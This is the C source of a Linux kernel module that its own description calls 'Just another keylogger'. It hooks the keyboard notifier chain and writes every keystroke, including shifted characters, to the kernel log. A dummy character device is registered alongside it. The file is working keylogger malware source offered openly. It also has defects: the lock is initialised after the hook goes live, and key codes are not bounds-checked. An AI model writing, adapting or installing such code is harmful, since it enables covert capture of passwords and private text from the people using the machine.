/*
 * =====================================================================================
 *
 *       Filename:  kl.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  30/10/14 09:14:18
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <asm/current.h>
#include <asm/uaccess.h>
#include <asm/segment.h>
#
#define DEVICE_NAME "kl_dev"
struct semaphore sem;

char msg_data[80]="Hello from the kernel";

static int major;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
  "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
  "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
  "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
  "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
  "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
  "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
  "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
  "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymapShiftActivated[] =
{ "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
  "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
  "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
  "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
  "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
  "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
  "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
  "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int shiftKeyDepressed = 0;

static int device_release(struct inode *inode, struct file *file) {

  return 0;
}
static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset) {
  
  if(copy_to_user(buffer,msg_data,strlen(msg_data)) != 0) {
    printk(KERN_ALERT "Error with user copy\n");
  }
  return strlen(msg_data);
}
static int device_open(struct inode *inode, struct file *file) {
  return 0;
}
static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
  printk(KERN_ALERT "This operation is not supported\n");
  return -EINVAL;
}
static struct file_operations fops = {
  .read = device_read,
  .write = device_write,
  .open = device_open,
  .release = device_release
};
int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  if(code == KBD_KEYCODE) {
    if( param->value==42 || param->value==54 )
    {
      down(&sem);
      if(param->down)
        shiftKeyDepressed = 1;
      else
        shiftKeyDepressed = 0;
      up(&sem);
      return NOTIFY_OK;
    }

    if(param->down)
    {
      down(&sem);
      if(shiftKeyDepressed == 0)
        printk(KERN_INFO "%s \n", keymap[param->value]);
      else
        printk(KERN_INFO "%s \n", keymapShiftActivated[param->value]);
      up(&sem);
    }
  }
  return NOTIFY_OK;
}
static struct notifier_block nb = {
  .notifier_call = notify_intercept
};

static int __init kl_init(void) {
  major = register_chrdev(0, DEVICE_NAME, &fops); 
  if(major < 0) {
    printk(KERN_ALERT "Unable to register char device %d\n",major);
    return major;
  }
  printk(KERN_INFO "Registered %s with major %d\n",DEVICE_NAME,major);
  register_keyboard_notifier(&nb);
  sema_init(&sem,1);
  return 0;
}
static void __exit kl_exit(void) {
  unregister_chrdev(major,DEVICE_NAME);
  unregister_keyboard_notifier(&nb);
}
module_init(kl_init);
module_exit(kl_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alex Jones <jonesax@hush.com>");
MODULE_DESCRIPTION("Just another keylogger");
